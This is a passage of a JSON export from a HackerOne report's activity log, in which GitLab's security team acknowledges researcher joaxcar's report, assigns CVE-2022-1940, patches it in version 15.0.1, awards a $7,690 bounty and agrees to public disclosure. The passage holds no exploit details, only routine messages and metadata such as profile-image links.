5YcHseEpZR6D9yp11HZu1B1Z9ccVeEbWoll9F%2Fl90jl7Darf0cRBdETJBVQe9lES5xsNEsTzJCU0hJC7cbhVgiFsvjy%2BsmVYuW%2BJ0Ir2DYYd%2BEAKSEPkMQzbR5JEOhhY35l4K5u%2FzDZNGAuBAAEQtj%2F79KdtjYW%2Fo3zHs0RmQMmpWUybphGAceZplAaCh5JeuSBsicB56wWgZXYoeowzDl%2BLioBjqxAavr89KptASCwoBoIcJJ1%2F%2F5OLzjaOfXS9rhOyPfMD4r39NrVSBqOuZEqOKLh8OZun7ZmvuZ6d%2Bu0%2Fq3yH0BFxg8fSuBxWsADt3u8ZMwDmRFAsTmr%2Fi0BfAgyXp3o3mJLIlnT3C6KGPZgG5zSxpe1VPmWP4RCUXcoIqHJJNfyToajUXSYsPPP%2FGEYB7eJNBTLXBAPJRkz74FOOGIE7hFLR1tttCq48hFanfnz69J0GhsHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4fc25536f8ae40162f22df951b078f639b207f19c9a448e3d09abfeaa917db37"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 16462687,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Hello @joaxcar,\n\nThanks for following up! We always appreciate the thorough and thoughtful information that you provide.\n\nHaving those two attack paths through different access levels clearly defined is helpful. I'll be sure that we take those into account when considering the severity of this report.\n\nHave a great day!\nAndrew\nSecurity Team | GitLab",
      "automated_response": false,
      "created_at": "2022-04-27T15:44:31.503Z",
      "updated_at": "2022-04-27T15:44:31.503Z",
      "actor": {
        "username": "akelly",
        "cleared": false,
        "verified": false,
        "url": "/akelly",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 16964176,
      "is_internal": false,
      "editable": false,
      "type": "Activities::CveIdAdded",
      "message": "",
      "automated_response": false,
      "created_at": "2022-06-01T23:56:00.081Z",
      "updated_at": "2022-06-01T23:56:00.081Z",
      "cve_ids": [
        "CVE-2022-1940"
      ],
      "actor": {
        "username": "nmalcolm_gitlab",
        "cleared": false,
        "verified": false,
        "url": "/nmalcolm_gitlab",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/qugqy57v49704ukw2816cro62zrc/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17128342,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugResolved",
      "message": "Hi @joaxcar,\n\nThank you again for the report! Your finding has been patched in GitLab version 15.0.1 and we are awarding a bounty. Congratulations!\n\nPlease let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker. If you'd like to publicly disclose this report or details of it in a blog post or elsewhere, please allow 30 days to pass before doing so to give time to our customers to upgrade to a patched version.\n\nWe look forward to your next report!\n\nBest regards,\nDominic\nGitLab Security Team",
      "automated_response": false,
      "created_at": "2022-06-14T20:35:32.273Z",
      "updated_at": "2022-06-14T20:35:32.273Z",
      "actor": {
        "username": "dcouture",
        "cleared": false,
        "verified": false,
        "url": "/dcouture",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "reporter": {
        "username": "joaxcar",
        "url": "/joaxcar"
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 17128351,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BountyAwarded",
      "message": "",
      "automated_response": false,
      "created_at": "2022-06-14T20:36:38.789Z",
      "updated_at": "2022-06-14T20:36:38.789Z",
      "actor": {
        "url": "/gitlab",
        "ibb": false,
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "profile": {
          "name": "GitLab"
        }
      },
      "bounty_amount": "7690.0",
      "bonus_amount": "0.0",
      "bounty_currency": "usd",
      "genius_execution_id": null,
      "team_handle": "gitlab",
      "collaborator": {
        "username": "joaxcar",
        "url": "/joaxcar"
      }
    },
    {
      "id": 18478471,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "Thanks for the fix and the bounty here!\n\nCould we disclose this one @dcouture ? I tried to review the content and cant find anything worth redacting. \n\n/Johan",
      "automated_response": false,
      "created_at": "2022-09-22T08:11:25.276Z",
      "updated_at": "2022-09-22T08:11:25.276Z",
      "first_to_agree": true,
      "actor": {
        "username": "joaxcar",
        "cleared": false,
        "verified": true,
        "url": "/joaxcar",
        "profile_picture_urls": {
          "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/9865qc9er7t2lratx5rgszbf3257/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89?response-content-disposition=inline%3B%20filename%3D%224FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg%22%3B%20filename%2A%3DUTF-8%27%274FB38693-148C-4D50-BBCD-D726D3AE2B4F.jpeg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZ363NV4N%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T065959Z&X-Amz-Expires=1095&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECkaCXVzLXdlc3QtMiJHMEUCIQCUKMH71SIb%2FoTww4o7Fyp5mQhZVTwsH6dhlfwUD7S8TwIgF4Omzzgoy7Eh%2FuuaDn6bJadywjrFCwcrXLyPd1UCs5kqsQUIIhADGgwwMTM2MTkyNzQ4NDkiDKGxZrCtnfrI2eKhbiqOBXD0daRtK7nXN8bU4wh8rs0TwC9%2FcJa7QcdjP2SAL2YxL6GkwLVHnakg45WQ%2BWk4Adhd6eDu4AekBKcLFkFd8k%2Fd5lubZW1GVCKCIIzX8mIHtiR6NWgAL1RYXyLJqsBolJgkbfAKgnxB2VBNu9cqdN0Sg6q46Ilnq1hqExJMLfqht15NsELU1U%2FQ19p63tws1LUaitduuiCmfbNrtck%2BJiuxte1AqtVx350x7u7AVd0SqMQXMgYhUrdnfQGkHw4PKw01gqvsRv0qYiR5T%2BJ02lVmbMGvHW0qzI3DYYUFIGfXcUFnGQSIaE%2FgPqRPsEBM6Lwmyz7ekYcfG4NAQPkX7s7d3l%2BAxF8xABewHt3siqiqDRwd%2BQ4qbNSRRB2PkDbmZ1eHzYDk4QbTDmVKIFyPKrkIkVF4XR4g2Coeli7hvF%2BckBOmv0p8iVYfRcyovSIhcdl6kBxgYFShVu%2FoppYowWnD2wehXrreQsVGuk%2FSEDklipqIstWBh044DkhjHK38BO2tKoCbBEd3HL%2F%2BCSTk87EjIAnzFVx1G%2Bg0F2Yj%2FB8WgRs4oGUj%2F%2FugSeXVb7VtlulwRZSm%2BK3L%2BBvsp0VDMXQNBHJyKN5tTlj1qWo5o325Ubas8A3WgFHAJYPgq4gNHNsbElI8w6eB%2BoTxkjdH2%2B5YcHseEpZR6D9yp11HZu1B1Z9ccVeEbWoll9F%2Fl90jl7Darf0cRBdETJBVQe9lES5xsNEsTzJCU0hJC7cbhVgiFsvjy%2BsmVYuW%2BJ0Ir2DYYd%2BEAKSEPkMQzbR5JEOhhY35l4K5u%2FzDZNGAuBAAEQtj%2F79KdtjYW%2Fo3zHs0RmQMmpWUybphGAceZplAaCh5JeuSBsicB56wWgZXYoeowzDl%2BLioBjqxAavr89KptASCwoBoIcJJ1%2F%2F5OLzjaOfXS9rhOyPfMD4r39NrVSBqOuZEqOKLh8OZun7ZmvuZ6d%2Bu0%2Fq3yH0BFxg8fSuBxWsADt3u8ZMwDmRFAsTmr%2Fi0BfAgyXp3o3mJLIlnT3C6KGPZgG5zSxpe1VPmWP4RCUXcoIqHJJNfyToajUXSYsPPP%2FGEYB7eJNBTLXBAPJRkz74FOOGIE7hFLR1tttCq48hFanfnz69J0GhsHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=4fc25536f8ae40162f22df951b078f639b207f19c9a448e3d09abfeaa917db37"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 18493671,
      "is_internal": false,
      "editable": false,
      "type": "Activities::AgreedOnGoingPublic",
      "message": "",
      "automated_response": false,
      "created_at": "2022-09-22T21:32:45.039Z",
      "updated_at": "2022-09-22T21:32:45.039Z",
      "actor": {
        "username": "dcouture",
        "cleared": false,
        "verified": false,
        "url": "/dcouture",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    },
    {
      "id": 18493672,
      "is_internal": false,
      "editable": false,
      "type": "Activities::ReportBecamePublic",
      "message": "",
      "automated_response": false,
      "created_at": "2022-09-22T21:32:45.193Z",
      "updated_at": "2022-09-22T21:32:45.193Z",
      "actor": {
        "username": "dcouture",
        "cleared": false,
        "verified": false,
        "url": "/dcouture",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/TpSJ356VRAW7GpCzzZ25R8Kb/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "gitlab"
    }
  ],
  "activity_page_count": 1,
  "activity_page_number": 1,
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}